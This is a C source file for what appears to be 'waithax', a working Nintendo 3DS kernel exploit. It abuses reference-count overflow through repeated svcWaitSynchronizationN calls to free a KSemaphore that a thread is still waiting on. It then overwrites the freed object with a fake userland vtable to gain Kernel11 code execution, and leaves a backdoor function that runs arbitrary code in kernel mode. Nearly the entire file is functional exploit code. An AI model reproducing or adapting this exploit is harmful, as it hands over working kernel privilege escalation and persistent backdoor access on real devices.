#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include "waithax.h"
#include "utils.h"


static Handle g_backdoor_semaphore;
static KSemaphore* g_backdoor_ksemaphore;

static KSemaphore* g_hax_ksemaphore;
static KSemaphore g_backup_data;
static void* g_fake_ksemaphore_vtable[KSEMAPHORE_VTABLESIZE / sizeof(void*)];

static void (*g_backdoor_method)(void);
static u32 g_exploit_result = 0;

static bool g_debug_mode = false;


static void K_Debug_PatchRefcount(KSemaphore *semaphore, u32 value)
{
	semaphore->refCount = value;
}

static bool waithax_kernel11_backdoor(KSemaphore *this, void *thread)
{
	g_backdoor_method();
	return true;
}

static void waithax_kernel11_setup_step1(KSemaphore *this)
{
	// Turn interrupts off
	__asm__ volatile("cpsid aif");

	// Backup the KObjectLink from the hax semaphore location
	memcpy(&g_backup_data, this, sizeof(KSemaphore));

	// Copy a valid KSemaphore on the current semaphore to prevent crashes after
	// returning from this fake vtable method
	memcpy(this, g_backdoor_ksemaphore, sizeof(KSemaphore));

	// Copy the KSemaphore vtable from kernel memory to the current userland
	// process' memory
	memcpy(g_fake_ksemaphore_vtable, this->vtable, KSEMAPHORE_VTABLESIZE);

	// Point the "backdoor" KSemaphore's vtable to the fake vtable located in
	// the current userland process' memory
	g_backdoor_ksemaphore->vtable = g_fake_ksemaphore_vtable;

	// Increment the refcount to not cause an unwanted deallocation when
	// WaitSynchronization1 terminates.
	this->refCount++;

	// Write the exploit result to validate the kernel code execution
	g_exploit_result = 0xcafebabe;
}

static void waithax_kernel11_setup_step2(void)
{
	// Turn interrupts off
	__asm__ volatile("cpsid aif");

	// Restore KObjectLink on the hax semaphore location
	memcpy(g_hax_ksemaphore, &g_backup_data, sizeof(KSemaphore));
}


static void waithax_setRefCount(Handle handle, u32 value)
{
	s64 outInfo;
	Result res = svcGetHandleInfo(&outInfo, handle, 1);
	u32 refCount = outInfo & 0xFFFFFFFF;
	printf("Handle %08lx, count: %08lx, res %08lx\n", handle, refCount, res);

	if(refCount == value)
		return;

	u32 loop = value - refCount;
	if(refCount > value)
		loop = (u32) -refCount + value;

	s32 out;
	Handle handles[0x100];
	for(u32 i = 0; i < 0x100; i++)
		handles[i] = handle;
	handles[0xFF] = 0xDEADDEAD;

	u32 bulkLoop = loop / 0xFF;
	u32 individualLoop = loop % 0xFF;

	for(u32 i = 0; i < bulkLoop; i++)
	{
		res = svcWaitSynchronizationN(&out, handles, 0x100, true, 0);
		refCount += 0xFF;

		if(i % 0x10000 == 0)
			printf("Left: %08lx | i: %08lx | count: %08lx\n", bulkLoop - i, i,
			refCount);
	}

	handles[1] = 0xDEADDEAD;
	for(u32 i = 0; i < individualLoop; i++)
	{
		res = svcWaitSynchronizationN(&out, handles, 2, true, 0);
		refCount++;

		printf("Left: %08lx | i: %08lx | count: %08lx\n", individualLoop - i, i,
			refCount);
	}
}


static void wait_thread(void *h)
{
	Handle semaphore = (Handle)h;
	Result res = svcWaitSynchronization(semaphore, 4000000000LL);
	printf("Thread WaitSync res: %08lx\n", res);
}



bool waithax_run(void)
{
	Result res;
	Handle sHax, sVtable;
	Thread thWait;
	u32 *kObject;


	// Setup KSemaphores
	res = svcCreateSemaphoreKAddr(&sHax, 0, 5, (u32**)&g_hax_ksemaphore);
	printf("Creating KSemaphore: %08lx h%08lx @%08lx\n", res, sHax,
		(u32)g_hax_ksemaphore);

	res = svcCreateSemaphoreKAddr(&sVtable, 0,
		(u32)waithax_kernel11_setup_step1, &kObject);
	printf("Creating KSemaphore: %08lx h%08lx @%08lx\n", res, sVtable,
		(u32)kObject);

	res = svcCreateSemaphoreKAddr(&g_backdoor_semaphore, 0, 5,
		(u32**)&g_backdoor_ksemaphore);
	printf("Creating KSemaphore: %08lx h%08lx @%08lx\n", res,
		g_backdoor_semaphore, (u32)g_backdoor_ksemaphore);


	// Setup the refcount
	if(g_debug_mode)
		svc_7b(K_Debug_PatchRefcount, g_hax_ksemaphore, 0U);
	else
		waithax_setRefCount(sHax, 0U);


	// Free the "vtable" KSemaphore
	svcCloseHandle(sVtable);


	// Spawn the wait thread
	printf("Spawning wait thread\n");
	thWait = threadCreate(wait_thread, (void*)sHax, 0x4000, 0x20, -2, true);


	// Deallocate the "hax" KSemaphore
	printf("Freeing hax KSemaphore\n");
	svcCloseHandle(sHax);


	// Wait for the thread execution to end, at which point Kernel11-mode code
	// will have been executed
	printf("Waiting for thread\n");
	threadJoin(thWait, 15000000000LL);


	// Setup the fake vtable method for the "backdoor" KSemaphore to run
	// Kernel11-mode code in a better environment and in an easier way
	printf("Setting up fake vtable method\n");
	g_fake_ksemaphore_vtable[12] = waithax_kernel11_backdoor;


	// Restore "hax" KSemaphore data
	waithax_backdoor(waithax_kernel11_setup_step2);


	// Return exploit result
	printf("Exploit result: %08lx\n", g_exploit_result);
	return g_exploit_result == 0xcafebabe;
}

void waithax_cleanup(void)
{
	svcCloseHandle(g_backdoor_semaphore);
}

void waithax_debug(bool enabled)
{
	g_debug_mode = enabled;
}

void waithax_backdoor(void (*method)(void))
{
	g_backdoor_method = method;
	svcWaitSynchronization(g_backdoor_semaphore, -1);
}
